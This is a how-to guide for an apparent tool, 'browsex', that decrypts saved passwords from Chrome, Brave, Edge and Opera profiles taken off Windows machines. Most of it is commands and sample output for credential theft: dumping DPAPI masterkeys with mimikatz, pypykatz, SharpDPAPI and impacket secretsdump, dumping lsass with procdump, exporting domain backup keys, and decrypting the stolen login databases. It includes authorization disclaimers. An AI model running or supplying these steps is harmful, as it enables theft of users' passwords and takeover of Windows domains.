# Cross-Platform DPAPI Decryption Guide

This guide explains how to decrypt **Windows Chrome/Brave/Edge/Opera profiles on Linux/macOS** using DPAPI masterkeys.

## Overview

**Problem**: Windows Chromium browsers encrypt passwords using Windows DPAPI (Data Protection API). When you exfiltrate a Windows Chrome profile and try to decrypt it on Linux/macOS, it fails because DPAPI is Windows-only.

**Solution**: Extract the DPAPI masterkey from the Windows machine and provide it to browsex with the `-k` flag.

## Quick Start

### 1. Extract DPAPI Masterkey (on Windows machine)

**Method 1: Using Mimikatz** (Requires Administrator)
```cmd
mimikatz.exe
privilege::debug
sekurlsa::dpapi
```

Look for output like:
```
[00000000]
 * GUID      :  {12345678-1234-1234-1234-123456789012}
 * Time      :  1/15/2024 10:30:00 AM
 * MasterKey :  1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
 * sha1(key) :  abcdef1234567890abcdef1234567890abcdef12
```

Copy the **MasterKey** value (64-byte hex string, 128 characters).

**Method 2: Using pypykatz** (Pure Python, no admin required in some cases)
```bash
pip install pypykatz
pypykatz live lsa
```

### 2. Exfiltrate Chrome Profile (on Windows machine)

Copy the entire `User Data` directory:
```
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\
```

**Required files**:
- `Local State` (contains encrypted master key)
- `Default/Login Data` (SQLite database with passwords)
- `Default/Bookmarks` (optional)
- `Default/History` (optional)

### 3. Decrypt on Linux/macOS

```bash
# Install dpapick3 support
cd Extract-Browsex
uv pip install -e ".[crossplatform]"

# Decrypt using masterkey
browsex chrome -p "User Data" --passwords -k 1a2b3c4d5e6f7a8b...64byte_hex
```

## Detailed Extraction Methods

### Option 1: Mimikatz (Most Common)

**Requirements**:
- Administrator privileges
- Windows 7+ (tested up to Windows 11)

**Steps**:
```cmd
# Download mimikatz from https://github.com/gentilkiwi/mimikatz/releases
mimikatz.exe

# Enable debug privilege
privilege::debug

# Extract DPAPI masterkeys
sekurlsa::dpapi

# Alternative: Save to file
sekurlsa::dpapi > dpapi_keys.txt
```

**Output Format**:
```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : username
Domain            : WORKSTATION
Logon Server      : WORKSTATION
Logon Time        : 1/15/2024 10:00:00 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-1000

	 * GUID      :  {12345678-1234-1234-1234-123456789012}
	 * Time      :  1/15/2024 10:30:00 AM
	 * MasterKey :  1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
	 * sha1(key) :  abcdef1234567890abcdef1234567890abcdef12
```

**Copy the MasterKey value** (128 hex characters = 64 bytes).

### Option 2: pypykatz (Python Alternative)

**Requirements**:
- Python 3.8+
- May require Administrator for full access

**Steps**:
```bash
# Install pypykatz
pip install pypykatz

# Extract from live system
pypykatz live lsa

# Or from memory dump (no Windows required)
pypykatz lsa minidump lsass.dmp
```

**Output Format**:
```json
{
  "authentication_id": 123456,
  "username": "username",
  "domainname": "WORKSTATION",
  "dpapi": [
    {
      "guid": "{12345678-1234-1234-1234-123456789012}",
      "masterkey": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d"
    }
  ]
}
```

### Option 3: Memory Dump (Offline)

**Requirements**:
- Memory dump from target Windows machine (`lsass.dmp`)

**Steps**:
```bash
# On Windows, create memory dump
procdump.exe -ma lsass.exe lsass.dmp

# Transfer lsass.dmp to analysis machine (Linux/macOS)

# Extract masterkey using pypykatz
pypykatz lsa minidump lsass.dmp
```

### Option 4: SharpDPAPI (C# Tool)

**Requirements**:
- Windows machine with .NET
- May require Administrator

**Steps**:
```cmd
# Download from https://github.com/GhostPack/SharpDPAPI
SharpDPAPI.exe masterkeys

# Output shows all masterkeys
```

### Option 5: Secretsdump (Impacket)

**Requirements**:
- Windows credentials or NTLM hash
- Remote access to Windows machine

**Steps**:
```bash
# Install impacket
pip install impacket

# Extract DPAPI masterkeys remotely
secretsdump.py domain/user:password@target-ip
```

### Option 6: Credential Files (Manual)

**Requirements**:
- Access to Windows filesystem
- DPAPI masterkey GUID (from `Local State`)

**Steps**:
```bash
# 1. Find DPAPI GUID in Local State
cat "User Data/Local State" | grep os_crypt

# 2. Locate masterkey file on Windows
%APPDATA%\Microsoft\Protect\<SID>\<GUID>

# 3. Use dpapick3 to decrypt (requires user password)
dpapick3 masterkey --file <GUID> --password <user_password>
```

### Option 7: Domain DPAPI Backup Keys (Enterprise)

**Requirements**:
- Domain Admin access
- Windows Server environment

**Steps**:
```bash
# Extract domain DPAPI backup key
mimikatz.exe "lsadump::backupkeys /system:DC01.domain.local /export" exit

# Use backup key to decrypt any user's masterkey
dpapick3 masterkey --file <GUID> --pvk domain_backup.pvk
```

## Validation

### Verify Masterkey Format

**Valid masterkey**:
- Exactly 128 hexadecimal characters (0-9, a-f, A-F)
- Represents 64 bytes of binary data
- Example: `1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d`

**Invalid examples**:
- Too short: `1a2b3c4d` (only 8 hex chars)
- Contains spaces: `1a 2b 3c 4d`
- Contains invalid characters: `1a2b3c4dXYZ`

**Validation command**:
```bash
# Check masterkey length
echo -n "YOUR_KEY_HERE" | wc -c
# Should output: 128

# Check hex format (all characters are 0-9a-fA-F)
echo "YOUR_KEY_HERE" | grep -E '^[0-9a-fA-F]{128}$'
# Should output the key if valid, nothing if invalid
```

### Test Decryption

```bash
# Verbose mode to see decryption process
browsex chrome -p "User Data" --passwords -k YOUR_KEY_HERE -v

# Expected output on success:
# [INFO] Using provided DPAPI masterkey for cross-platform decryption
# [INFO] Decrypted 32-byte AES key using masterkey
# [INFO] Successfully decrypted 3 logins
# 
# URL: https://github.com
# Username: user@example.com
# Password: secret123
```

### Common Errors

**Error: "Invalid masterkey format"**
```
Cause: Masterkey is not 128 hex characters
Fix: Verify you copied the entire masterkey from mimikatz output
```

**Error: "MAC check failed"**
```
Cause: Wrong masterkey for this profile OR masterkey extraction failed
Fix: Re-extract masterkey using mimikatz, ensure correct Windows user
```

**Error: "dpapick3 not installed"**
```
Cause: Missing dpapick3 dependency
Fix: uv pip install -e ".[crossplatform]"
```

**Error: "Failed to decrypt DPAPI blob"**
```
Cause: Masterkey doesn't match the DPAPI blob in Local State
Fix: 
  1. Verify you're using masterkey from the SAME Windows user who created the profile
  2. Try extracting masterkey again (mimikatz sometimes shows multiple keys)
  3. Check if profile is from a different Windows login session
```

## Important Notes

### Masterkey Scope

**One masterkey works for ALL Chromium browsers** from the same Windows user:
- Chrome
- Brave
- Edge
- Opera

**Example**:
```bash
# Same masterkey works for all browsers
MASTERKEY="1a2b3c4d5e6f..."

browsex chrome -p "Chrome/User Data" --passwords -k $MASTERKEY
browsex brave -p "Brave/User Data" --passwords -k $MASTERKEY
browsex edge -p "Edge/User Data" --passwords -k $MASTERKEY
```

### Security Considerations

1. **Masterkey is extremely sensitive**: With it, anyone can decrypt all DPAPI-protected data for that user
2. **Store securely**: Do not commit masterkeys to git, do not store in plaintext
3. **Rotate credentials**: After exfiltration exercises, rotate all passwords
4. **Legal compliance**: Only use on systems you own or have explicit authorization to test

### Limitations

**Does NOT work for**:
- App-Bound Encryption (Chrome 127+ on Windows)
- Profiles from different Windows users (each user has unique masterkeys)
- Profiles encrypted with hardware TPM (requires physical access)

**Works for**:
- Chrome versions up to 126 on Windows
- All Brave/Edge/Opera versions using DPAPI
- Profiles exfiltrated from any Windows version (7+)

## Troubleshooting

### Multiple Masterkeys in Mimikatz Output

Mimikatz may show 10+ masterkeys. Which one to use?

**Strategy**:
1. Try the **most recent** masterkey (latest timestamp)
2. If that fails, try others from **the same user session**
3. Look for the one with GUID matching `Local State` (advanced)

**Example**:
```
# Extract GUID from Local State
strings "User Data/Local State" | grep encrypted_key

# Match GUID in mimikatz output
sekurlsa::dpapi | grep -A5 "GUID.*{12345678-1234-1234-1234-123456789012}"
```

### Profile from Domain User

**Problem**: Profile from domain-joined Windows machine

**Solutions**:
1. **Use pypykatz with domain creds**: `pypykatz live lsa --username DOMAIN\\user --password pass`
2. **Extract domain backup key**: Requires Domain Admin (see Option 7)
3. **Use local cached credentials**: Mimikatz with `sekurlsa::dpapi` may have cached domain masterkeys

### Testing Without Real Windows Machine

**Use test fixtures**:
```bash
# Create mock masterkey (for development only)
python3 << 'EOF'
import secrets
masterkey = secrets.token_hex(64)  # 64 bytes = 128 hex chars
print(f"Test masterkey: {masterkey}")
EOF
```

**Note**: Mock masterkey won't decrypt real profiles, only useful for testing code paths.

## Reference

### DPAPI Architecture

1. **User logs into Windows** → Windows generates user-specific DPAPI masterkey(s)
2. **Chrome launches** → Requests Windows to encrypt 32-byte AES key using DPAPI
3. **Windows DPAPI** → Encrypts AES key, stores in `Local State` with DPAPI prefix (`01 00 00 00 D0 8C 9D DF...`)
4. **Chrome encrypts passwords** → Uses the 32-byte AES key (AES-256-GCM with nonce/tag)
5. **User exfiltrates profile** → Gets `Local State` (DPAPI blob) + `Login Data` (AES-GCM encrypted passwords)
6. **Decryption on Linux** → Requires DPAPI masterkey to decrypt blob → get AES key → decrypt passwords

### File Format

**Local State (JSON)**:
```json
{
  "os_crypt": {
    "encrypted_key": "RFBBUEkBAAAA0Iyd...BASE64_ENCODED_DPAPI_BLOB"
  }
}
```

**Decoding**:
```
BASE64_DECODE → [DPAPI][5-byte prefix][encrypted 32-byte AES key][integrity check]
                  ^
                  01 00 00 00 D0 8C 9D DF...
```

**Decryption Flow**:
```
1. Base64 decode encrypted_key
2. Remove "DPAPI" prefix (5 bytes)
3. Decrypt remaining blob using masterkey → 32-byte AES key
4. Use AES key to decrypt passwords in Login Data (AES-256-GCM)
```

### Useful Links

- **Mimikatz**: https://github.com/gentilkiwi/mimikatz
- **pypykatz**: https://github.com/skelsec/pypykatz
- **dpapick3**: https://github.com/tijldeneut/DPAPIck3
- **SharpDPAPI**: https://github.com/GhostPack/SharpDPAPI
- **DPAPI Technical Details**: https://www.passcape.com/index.php?section=docsys&cmd=details&id=28

## FAQ

**Q: Can I decrypt without the masterkey?**
A: No. Without the masterkey, you must be logged in as the Windows user and run browsex on that Windows machine.

**Q: Does the masterkey change?**
A: Rarely. Windows generates new masterkeys periodically or after password changes, but old ones remain valid for backward compatibility.

**Q: Can I use this for macOS Chrome profiles?**
A: No. macOS uses Keychain, which requires physical access to the Mac and user password. No "masterkey" equivalent exists.

**Q: What about Linux Chrome profiles?**
A: Linux uses libsecret/secretstorage. Passwords are already decryptable on the same Linux machine without extra keys (install `secretstorage`).

**Q: Is this legal?**
A: **Only for penetration testing with authorization or recovering your own passwords**. Unauthorized access is illegal under CFAA (US), Computer Misuse Act (UK), and similar laws worldwide.
